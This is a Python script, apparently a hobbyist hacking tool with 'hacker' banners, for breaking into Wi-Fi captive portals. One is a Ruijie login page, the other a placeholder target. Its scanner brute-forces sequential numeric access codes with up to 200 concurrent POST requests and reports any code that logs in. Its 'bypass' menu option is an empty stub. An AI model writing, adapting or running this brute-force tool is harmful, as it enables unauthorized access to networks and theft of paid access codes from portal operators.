import asyncio, aiohttp, time, os, uuid, sys, urllib3
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from tqdm import tqdm

# CONFIGURATION
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# LOGO & BANNER (Original Look Restored)
BABY_LOGO = "\n[bold cyan]      _ \n    _(_)_ \n   (_)@(_) \n     (_)\  / \n      /  || \n  ___/___||___\n |____________|[/bold cyan]"
BANNER = "[bold #00FF00]\n ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦\n ║║║║ ║║╣   ╚╦╝║ ║\n ╩ ╩╚═╝╚═╝   ╩ ╚═╝\n      [#00FF00]M O E   Y U   H A C K E R[/#00FF00][/bold #00FF00]"

PORTALS = {
    "1": {"name": "Ruijie Old Portal", "url": "http://192.168.60.1/auth", "payload": "code"},
    "2": {"name": "Modern Captive Portal", "url": "http://target-portal.com/login", "payload": "password"}
}

def display_hacker_flag():
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v7.8 (FULL)[/bold cyan]\n"))

# VALIDATION SCANNER
async def scan_worker(sem, session, code, target_cfg):
    async with sem:
        try:
            async with session.post(target_cfg['url'], data={target_cfg['payload']: code}, timeout=3) as resp:
                text = await resp.text()
                # Validation Logic: Success ပါပြီး Failed မပါမှ Hit အစစ်
                if "Login Success" in text and "Authentication failed" not in text:
                    console.print(f"\n[bold green][!] REAL HIT FOUND: {code}[/bold green]")
                    return True
        except: pass
    return False

async def run_scanner(target_cfg, start_r, end_r):
    console.print(f"[yellow][*] Scanning: {target_cfg['name']}[/yellow]")
    connector = aiohttp.TCPConnector(limit=200)
    sem = asyncio.Semaphore(200)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in tqdm(range(start_r, end_r), desc="Scanning Codes", unit="code"):
            task = asyncio.create_task(scan_worker(sem, session, str(i), target_cfg))
            tasks.append(task)
        await asyncio.gather(*tasks)

# MAIN
if __name__ == "__main__":
    while True:
        display_hacker_flag()
        console.print(Panel("[bold white]1. Start Bypass\n2. Start Scanner\n3. Exit[/bold white]", title="[bold cyan]MENU[/bold cyan]"))
        choice = input(" [?] Option: ")
        
        if choice == "1":
            console.print("[yellow][*] Initializing Bypass...[/yellow]")
            time.sleep(1)
        elif choice == "2":
            console.print("Target: [1] Old [2] New")
            t_choice = input(" >> ")
            target = PORTALS.get(t_choice)
            if target:
                try:
                    s = int(input("Start: "))
                    e = int(input("End: "))
                    asyncio.run(run_scanner(target, s, e))
                except KeyboardInterrupt:
                    console.print("\n[red]Stopped![/red]")
        elif choice == "3":
            sys.exit()
